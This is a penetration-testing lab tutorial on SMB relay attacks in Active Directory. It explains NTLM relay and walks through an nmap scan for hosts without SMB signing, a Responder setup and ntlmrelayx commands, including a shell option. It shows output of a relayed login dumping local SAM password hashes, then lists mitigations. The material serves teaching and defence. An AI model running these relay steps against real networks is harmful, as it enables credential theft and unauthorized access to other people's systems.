# SMB Relay

### What is SMB?

SMB (Server Message Block) is a network file-sharing protocol primarily used in Windows environments. It allows systems to share files, printers, and other resources over a network and supports authentication to access those resources.

### What can go wrong here?

**the attacker positions themselves as a man-in-the-middle (MITM) between the client and the target system**

- An SMB relay attack occurs when an attacker intercepts NTLM authentication traffic intended for one machine and relays it to another without cracking the credentials. Instead of capturing hashes for offline attacks, the attacker reuses the authentication in real time to gain unauthorized access, often achieving code execution or administrative privileges on the relayed system.

- With LLMNR/NBT-NS poisoning (Responder), the attacker tricks the client into talking to them instead of the real server. Normally this just lets them capture the NTLM challenge–response.

- With SMB relay, instead of stopping there, the attacker forwards the client’s authentication attempt to a real server. The attacker is now in the middle:

  - Client thinks it’s authenticating to the intended server.

  - Target server thinks it’s authenticating the client.

  - Attacker just passes messages back and forth, never needing to crack the password or hash.

- SMB is vulnerable to relay attacks because NTLM authentication does not bind the client’s authentication attempt to the intended server. Without SMB signing, the protocol does not verify the integrity and authenticity of the messages, allowing attackers to insert themselves into the authentication process.

```{figure} ../../../_static/AD/smb-relay.png
:alt: Sequence Diagram of Relay Attack
:width: 100%
:align: center

Relay Attack

```

### Attack Requirements

SMB signing must be disabled or not enforced on the target system, the relayed user must have local administrative rights for meaningful impact, and credentials cannot be relayed back to the machine they originated from. Since NTLM is reused directly, password strength has no effect on the attack’s success. Notably, most Windows workstations by default do not enforce SMB signing, making them susceptible

### SMB Relay in AD

#### Step 1: Identifying workstations without SMB Signing Enforced

```
nmap --script=smb2-security-mode.nse -p445 <target-ip> -Pn
```

```
Nmap scan report for 10.0.2.18
Host is up (0.0016s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:80:FA:D3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required


Nmap scan report for 10.0.2.17
Host is up (0.00082s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:92:B4:94 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required


Nmap scan report for 10.0.2.16
Host is up (0.00058s latency).

PORT    STATE    SERVICE
445/tcp filtered microsoft-ds
MAC Address: 08:00:27:EA:E2:55 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

```

#### Step 2: Setting up the attack

We first have to disable SMB and HTTP in Responder, as these will be forwarded to nlmrelayx.

```
sudo vim /etc/responder/Responder.conf

-- switch SMB and HTTP Off

sudo responder -I eth0 -dwv
```

```
impacket-ntlmrelayx -tf targets.txt -smb2support
```

```
-- to start a shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i for shell
```

#### Step 3: An Event Occurs and Credentials Get Relayed

When an event (such as LLMNR poisoning) occurrs, responder will capture this event, pass it to ntlmrelayx, which will relay the credentials to the targets in our targets file.

In our lab we simulate an event by pointing to the attacker machine ip `\\10.0.2.15` on THEPUNISHER fcastle machine (fcastle is admin on SPIDERMAN so we can authenticate there and dump the local SAM hashes)

```
[*] Received connection from MARVEL/fcastle at THEPUNISHER, connection will be relayed after re-authentication
[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/FCASTLE@10.0.2.16 controlled, attacking target smb://10.0.2.17
[*] Authenticating against smb://10.0.2.17 as MARVEL/FCASTLE SUCCEED
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c7c36b0f2e6cf2201e6ce026fca58d9c:::
```

The SAM (Security Account Manager) is a database in Windows that stores local user account information, including hashed representations of passwords. When attackers “dump the SAM,” they extract these password hashes to attempt cracking or use them in pass-the-hash attacks.

Each entry in a dumped SAM file typically follows the format:
username:RID:LM hash:NT hash:::

- Username is the account name (e.g., Administrator, Guest, or a local user).

- RID (Relative Identifier) is a unique number associated with each account. For example, 500 usually corresponds to the built-in Administrator account, 501 to Guest, and 1000+ to user-created accounts.

- LM hash is the old LAN Manager hash of the password. In modern Windows systems, LM hashes are usually disabled by default and appear as the placeholder value aad3b435b51404eeaad3b435b51404ee.

- NT hash is the NTLM hash of the password, derived from the actual user password. This is the primary target for attackers since it can be cracked offline or used directly in authentication attacks.

### Mitigations

Mitigation strategies include enabling and enforcing SMB signing on all systems, disabling NTLM where possible, and using Kerberos as the preferred authentication method.
Restricting administrative privileges, segmenting networks, and applying the principle of least privilege reduce the value of relayed credentials.

#### References

- [https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/](https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/)
